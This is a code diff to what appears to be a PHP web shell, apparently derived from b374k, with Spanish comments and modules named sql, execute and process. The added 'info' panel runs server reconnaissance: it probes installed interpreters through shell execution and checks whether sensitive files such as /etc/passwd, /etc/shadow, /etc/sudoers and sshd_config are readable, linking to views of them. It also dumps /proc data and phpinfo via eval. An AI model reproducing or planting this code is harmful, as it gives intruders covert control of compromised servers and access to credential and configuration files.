@@ -1129,6 +1129,9 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			margin: 5px;
 			padding: 6px;
 		}
+		select, option{
+			padding: 3px;
+		}
 		p{
 			margin-top: 0px;
 			margin-bottom: 0px; 
@@ -2431,7 +2434,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 		$sBuff .= '
 			<div class="table floatCenter" style="width: 50%;">
 				<div class="table-row">
-					<div class="table-col floatCenter"><b>' . tText('sql', 'SQL') . '</b></div>
+					<div class="table-col floatCenter"><h2>' . tText('sql', 'SQL') . '</h2></div>
 				</div>
 				<div class="table-row" style="text-align:left;">
 					<div class="table-col"><form>' .
@@ -2609,72 +2612,190 @@ if (isset($p['me']) && $p['me'] === 'execute'){
 }
 
 if (isset($p['me']) && $p['me'] === 'info'){
-    $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
-    $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
-    $dis_func = get_cfg_var('disable_functions');
-    ! $dis_func && $dis_func = 'No';
-
-    $info = array(
-        1 => array('Server Time', date('Y/m/d h:i:s', time())),
-        2 => array('Server Domain', $_SERVER['SERVER_NAME']),
-        3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])),
-        4 => array('Server OS', PHP_OS),
-        5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']),
-        6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']),
-        7 => array('Server Web Port', $_SERVER['SERVER_PORT']),
-        8 => array('PHP run mode', php_sapi_name()),
-        9 => array('This file path', __file__),
-        10 => array('PHP Version', PHP_VERSION),
-        11 => array('PHP Info', ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<a href="#" onclick="ajaxLoad(\'me=phpinfo\')">Yes</a>' : 'No')),
-        12 => array('Safe Mode', getcfg('safe_mode')),
-        13 => array('Administrator', $adminmail),
-        14 => array('allow_url_fopen', getcfg('allow_url_fopen')),
-        15 => array('enable_dl', getcfg('enable_dl')),
-        16 => array('display_errors', getcfg('display_errors')),
-        17 => array('register_globals', getcfg('register_globals')),
-        18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')),
-        19 => array('memory_limit', getcfg('memory_limit')),
-        20 => array('post_max_size', getcfg('post_max_size')),
-        21 => array('upload_max_filesize', $upsize),
-        22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'),
-        23 => array('disable_functions', $dis_func),
-        24 => array('MySQL', getfun('mysql_connect')),
-        25 => array('MSSQL', getfun('mssql_connect')),
-        26 => array('PostgreSQL', getfun('pg_connect')),
-        27 => array('Oracle', getfun('ocilogon')),
-        28 => array('Curl', getfun('curl_version')),
-        29 => array('gzcompress', getfun('gzcompress')),
-        30 => array('gzencode', getfun('gzencode')),
-        31 => array('bzcompress', getfun('bzcompress')),
-    );
-
     if (@sValid($p['phpvarname'])) $sBuff .= sDialog($p['phpvarname'] . ': ' . getcfg($p['phpvarname']));
-
     $sBuff .= '<form> 
         <h2>Variables del servidor</h2> 
         <p>Ingrese los parametros PHP de configuracion (ej: magic_quotes_gpc)
         <input name="phpvarname" id="phpvarname" value="" type="text" size="100" /> <input name="submit" id="submit" type="submit" value="Submit"></p> 
         </form>';
+		
+		
+	//principal resume
+	$dis_func = get_cfg_var('disable_functions');
+    !$dis_func && $dis_func = 'No';
 
-    $hp = array(0 => 'Server', 1 => 'PHP', 2 => 'Extras');
-    for ($a = 0; $a < 3; $a++){
-        $sBuff .= '<h2>' . $hp[$a] . '</h2><ul>';
-        if ($a == 0){
-            for ($i = 1; $i <= 9; $i++){
-                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
-            }
-        } elseif ($a == 1){
-            for ($i = 10; $i <= 23; $i++){
-                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
-            }
-        } elseif ($a == 2){
-            for ($i = 24; $i <= 31; $i++){
-                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
-            }
-        }
+	$sBuff .= "<p class='boxtitle' onclick=\"toggle('info');\" style='margin-bottom:8px;'>Resume</p>" .
+		"<div id='info' style='margin-bottom:8px;display:none;'><table class='dataView'>";
+    $info = array(
+        'Server Time' => date('Y/m/d h:i:s', time()),
+        'Server Domain' => $_SERVER['SERVER_NAME'],
+        'Server IP' => gethostbyname($_SERVER['SERVER_NAME']),
+        'Server OS' => PHP_OS,
+        'Server OS Charset' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
+        'Server Software' => $_SERVER['SERVER_SOFTWARE'],
+        'Server Web Port' => $_SERVER['SERVER_PORT'],
+        'PHP run mode' => php_sapi_name(),
+        'This file path' => __file__,
+        'PHP Version' => PHP_VERSION,
+        'PHP Info' => ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<a href="#" onclick="ajaxLoad(\'me=phpinfo\')">Yes</a>' : 'No'),
+        'Safe Mode' => getcfg('safe_mode'),
+        'Administrator' => (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')),
+        'allow_url_fopen' => getcfg('allow_url_fopen'),
+        'enable_dl' => getcfg('enable_dl'),
+        'display_errors' => getcfg('display_errors'),
+        'register_globals' => getcfg('register_globals'),
+        'magic_quotes_gpc' => getcfg('magic_quotes_gpc'),
+        'memory_limit' => getcfg('memory_limit'),
+        'post_max_size' => getcfg('post_max_size'),
+        'upload_max_filesize' => (getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'),
+        'max_execution_time' => getcfg('max_execution_time') . ' second(s)',
+        'disable_functions' => $dis_func,
+        'MySQL' => getfun('mysql_connect'),
+        'MSSQL' => getfun('mssql_connect'),
+        'PostgreSQL' => getfun('pg_connect'),
+        'Oracle' => getfun('ocilogon'),
+        'Curl' => getfun('curl_version'),
+        'gzcompress' => getfun('gzcompress'),
+        'gzencode' => getfun('gzencode'),
+        'bzcompress' => getfun('bzcompress')
+    );
+	
+	foreach ($info as $v => $k)
+		$sBuff .= "<tr><td>$v</td><td>$k</td></tr>";
+	
+	$sBuff .= "</table></div>";
+		
+	//based on b374k work	
+	//server misc info
+	$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>" .
+		"<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";
+	if ($isWIN){
+		foreach (range("A", "Z") as $letter){
+			if(is_readable($letter.":\\")){
+				$drive = $letter.":";
+				$sBuff .= "<tr><td>drive $drive</td><td>" . sizecount(@disk_free_space($drive)) . " free of " . sizecount(@disk_total_space($drive)) . "</td></tr>";
+			}
+		}
+	} else 
+		$sBuff .= "<tr><td>root partition</td><td>" . sizecount(@disk_free_space("/")) . " free of " . sizecount(@disk_total_space("/")) . "</td></tr>";
 
-        $sBuff .= '</ul>';
-    }
+	$sBuff .= "<tr><td>PHP</td><td>" . phpversion() . "</td></tr>";
+	$access = array(
+			"python"=>"python -V",
+			"perl"=>"perl -e \"print \$]\"",
+			"python"=>"python -V",
+			"ruby"=>"ruby -v",
+			"node"=>"node -v",
+			"nodejs"=>"nodejs -v",
+			"gcc"=>"gcc -dumpversion",
+			"java"=>"java -version",
+			"javac"=>"javac -version"
+		);
+
+	foreach($access as $k => $v){
+		$v = explode("\n", execute($v));
+		if ($v[0]) $v = $v[0];
+		else $v = "?";
+
+		$sBuff .= "<tr><td>$k</td><td>$v</td></tr>";
+	}
+
+	if(!$isWIN){
+		$interesting = array(
+			"/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
+			"/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
+			"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
+			"/etc/ssh/sshd_config",
+			"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
+			"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
+			"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules"
+		);
+		foreach($interesting as $f){
+			if (@is_file($f) && @is_readable($f)) 
+				$sBuff .= "<tr><td>$f</td><td><a data-path='$f' onclick='view_entry(this);'>$f is readable</a></td></tr>";
+		}
+	}
+	$sBuff .= "</table></div>";
+
+	
+	// cpu info
+	if(!$isWIN){
+		if ($i_buff=trim(read_file("/proc/cpuinfo"))){
+			$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>" .
+				"<div class='info' id='info_cpu' style='margin-bottom:8px;display:none;'>";
+			$i_buffs = explode("\n\n", $i_buff);
+			foreach($i_buffs as $i_buffss){
+				$i_buffss = trim($i_buffss);
+				if($i_buffss!=""){
+					$i_buffsss = explode("\n", $i_buffss);
+					$sBuff .= "<table class='dataView'>";
+					foreach($i_buffsss as $i){
+						$i = trim($i);
+						if($i!=""){
+							$ii = explode(":",$i);
+							if(count($ii)==2) $sBuff .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
+						}
+					}
+					$sBuff .= "</table>";
+				}
+			}
+			$sBuff .= "</div>";
+		}
+
+		// mem info
+		if ($i_buff=trim(read_file("/proc/meminfo"))){
+			$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>" .
+				"<div class='info' id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>";
+			$i_buffs = explode("\n", $i_buff);
+			foreach($i_buffs as $i){
+				$i = trim($i);
+				if($i!=""){
+					$ii = explode(":", $i);
+					if(count($ii)==2) $sBuff .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
+				} else 
+					$sBuff .= "</table><table class='dataView'>";
+			}
+			$sBuff .= "</table></div>";
+		}
+
+		// partition
+		if ($i_buff=trim(read_file("/proc/partitions"))){
+			$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>" .
+				"<div class='info' id='info_part' style='margin-bottom:8px;display:none;'>" .
+				"<table class='dataView'><tr>";
+			$i_buff = preg_replace("/\ +/", " ", $i_buff);
+			$i_buffs = explode("\n\n", $i_buff);
+			$i_head = explode(" ", $i_buffs[0]);
+			foreach($i_head as $h) $sBuff .= "<th>$h</th>";
+			$sBuff .= "</tr>";
+			$i_buffss = explode("\n", $i_buffs[1]);
+			foreach($i_buffss as $i_b){
+				$i_row = explode(" ", trim($i_b));
+				$sBuff .= "<tr>";
+				foreach($i_row as $r) $sBuff .= "<td style='text-align:center;'>".$r."</td>";
+				$sBuff .= "</tr>";
+			}
+			$sBuff .= "</table></div>";
+		}
+	}
+	
+	$phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES);
+	foreach($phpinfo as $p=>$i){
+		$sBuff .= "<p class='boxtitle' onclick=\"toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>";
+		ob_start();
+		eval("phpinfo(".$i.");");
+		$b = ob_get_contents();
+		ob_end_clean();
+		if(preg_match("/<body>(.*?)<\/body>/is", $b, $r)){
+		$body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
+		$body = str_replace("<table", "<table class='boxtbl' ", $body);
+		$body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
+		$body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", "", $body);
+		$body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", "", $body);
+
+		$sBuff .= "<div class='info' id='".$i."' style='margin-bottom:8px;display:none;'>".$body."</div>";
+		}
+	}
 }
 
 if (isset($p['me']) && $p['me'] === 'process'){
